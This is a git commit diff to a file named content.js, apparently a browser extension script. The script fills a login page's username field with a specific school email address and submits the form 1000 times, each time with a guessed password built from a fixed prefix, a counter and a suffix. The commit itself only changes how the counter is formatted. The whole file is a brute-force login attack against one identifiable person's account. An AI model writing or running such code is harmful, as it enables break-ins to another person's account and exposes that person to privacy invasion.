3a9921b0ff4b079ea29a93f54edccd7f2e4b3a65
Moomoomooo <83972202+Moomoomooo@users.noreply.github.com>
2025-10-24 09:26:20 -0400

    Update content.js

--- src/content.js
+++ src/content.js
@@ -4,12 +4,9 @@ const passwordBox = document.getElementById("j_password")
 
 for (let i=0; i < 1000; i++) {
   usernameBox.value = "26ponirosa@oceanschools.org"
-  passwordBox.value = "OTISa7" + format(i) + "p"
+  passwordBox.value = "OTISa7" + i + "p"
 
   form.requestSubmit();
 }
 
-function format(integer) {
-  let value = "00000" + integer
-  return value.slice(-5)
-}
+
